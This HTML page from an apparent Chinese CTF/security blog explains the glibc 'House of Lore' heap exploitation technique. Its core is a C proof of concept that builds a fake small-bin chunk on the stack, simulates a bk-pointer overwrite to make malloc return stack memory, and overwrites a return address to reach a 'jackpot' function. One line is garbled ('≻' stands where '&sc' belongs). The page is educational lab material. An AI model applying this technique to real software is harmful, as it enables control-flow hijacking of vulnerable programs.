@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>House of Lore | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of Lore">
+<meta property="og:url" content="https://yichen115.github.io/2020/09/17/prkw8a/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1600589399497-c0c6c4e3-77b1-494f-a517-8239984658a8.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=777&size=46289&status=done&style=none&width=637">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1600589503218-1fa6876b-b219-473d-91e9-1647fc3b0ea4.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=526&size=30561&status=done&style=none&width=438">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1600589811846-a3c7f408-6dab-4493-b816-c354a8b5c03d.png#align=left&display=inline&height=86&margin=%5Bobject%20Object%5D&name=image.png&originHeight=102&originWidth=527&size=12031&status=done&style=none&width=445">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1600589949684-8d030612-6d11-401a-92e4-b039ec69e5e2.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=528&size=13417&status=done&style=none&width=449">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1600591783067-a9476144-ebc8-46ff-b794-5ded490ad3df.png#align=left&display=inline&height=34&margin=%5Bobject%20Object%5D&name=image.png&originHeight=34&originWidth=185&size=3641&status=done&style=none&width=185">
+<meta property="article:published_time" content="2020-09-17T02:57:48.000Z">
+<meta property="article:modified_time" content="2020-12-29T01:58:39.126Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1600589399497-c0c6c4e3-77b1-494f-a517-8239984658a8.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=777&size=46289&status=done&style=none&width=637">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">House of Lore</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">House of Lore</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-09-17T02:57:48.000Z" itemprop="datePublished" class="page-time">
+  2020-09-17
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+
+<article id="post-prkw8a"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">House of Lore</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-09-17 10:57:48" datetime="2020-09-17T02:57:48.000Z"  itemprop="datePublished">2020-09-17</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Nice jump d00d\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"定义了两个数组"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 在 %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 在 %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"申请第一块属于 fastbin 的 chunk 在 %p\n"</span>, victim);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;<span class="comment">//chunk 开始的位置</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"在栈上伪造一块 fake chunk\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"另外再分配一块，避免与 top chunk 合并 %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Free victim chunk %p, 他会被插入到 fastbin 中\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n此时 victim chunk 的 fd、bk 为零\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n"</span>, victim);</span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fd: %p\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n"</span>);</span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"然后申请跟第一个 chunk 大小一样的 chunk\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n"</span>);</span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"最后 malloc 一次会返回 victim-&gt;bk 指向的那里\n"</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n"</span>,stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 在栈上 %p\n"</span>, p4);</span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), ≻, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>intptr_t *victim = malloc(100);</code><br>首先申请了一个在 fastbin 范围内的 victim chunk，然后再在栈上构造了一个假的 chunk</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600589399497-c0c6c4e3-77b1-494f-a517-8239984658a8.png#align=left&display=inline&height=197&margin=%5Bobject%20Object%5D&name=image.png&originHeight=240&originWidth=777&size=46289&status=done&style=none&width=637" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>为了绕过检测，设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600589503218-1fa6876b-b219-473d-91e9-1647fc3b0ea4.png#align=left&display=inline&height=143&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=526&size=30561&status=done&style=none&width=438" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>接下来先 malloc 一个防止 free 之后与 top chunk 合并，然后 free 掉 victim，这时候 victim 会被放到 fastbin 中</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600589811846-a3c7f408-6dab-4493-b816-c354a8b5c03d.png#align=left&display=inline&height=86&margin=%5Bobject%20Object%5D&name=image.png&originHeight=102&originWidth=527&size=12031&status=done&style=none&width=445" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>接下来再去 malloc 一个 large chunk，会触发 fastbin 的合并，然后放到 unsorted bin 中，这样我们的 victim chunk 就放到了 unsorted bin 中，然后最终被 unsorted bin 分配到 small bin 中<br>参考：<br><a href="http://blog.topsec.com.cn/pwn的艺术浅谈（二）：linux堆相关/" target="_blank" rel="noopener">http://blog.topsec.com.cn/pwn 的艺术浅谈（二）：linux 堆相关/</a><br><a href="https://bbs.pediy.com/thread-257742.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257742.htm</a></p>
+<p><strong>再把 victim 的 bk 指针改为 stack_buffer_1</strong></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600589949684-8d030612-6d11-401a-92e4-b039ec69e5e2.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=528&size=13417&status=done&style=none&width=449" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>再次去 malloc 会 malloc 到 victim chunk，再一次 malloc 的话就 malloc 到了 0x00007fffffffdcc0</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600591783067-a9476144-ebc8-46ff-b794-5ded490ad3df.png#align=left&display=inline&height=34&margin=%5Bobject%20Object%5D&name=image.png&originHeight=34&originWidth=185&size=3641&status=done&style=none&width=185" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-12-29T01:58:39.126Z" itemprop="dateUpdated">2020-12-29 09:58:39</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/09/17/prkw8a/&title=《House of Lore》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/09/17/prkw8a/&title=《House of Lore》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/09/17/prkw8a/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《House of Lore》 — yichen's blog&url=https://yichen115.github.io/2020/09/17/prkw8a/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/09/17/prkw8a/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/09/23/ct0mzz/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">House of Orange</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/09/13/gwcg1c/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">House Of Force</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/09/17/prkw8a/&title=《House of Lore》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/09/17/prkw8a/&title=《House of Lore》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/09/17/prkw8a/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《House of Lore》 — yichen's blog&url=https://yichen115.github.io/2020/09/17/prkw8a/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/09/17/prkw8a/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/09/17/prkw8a/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
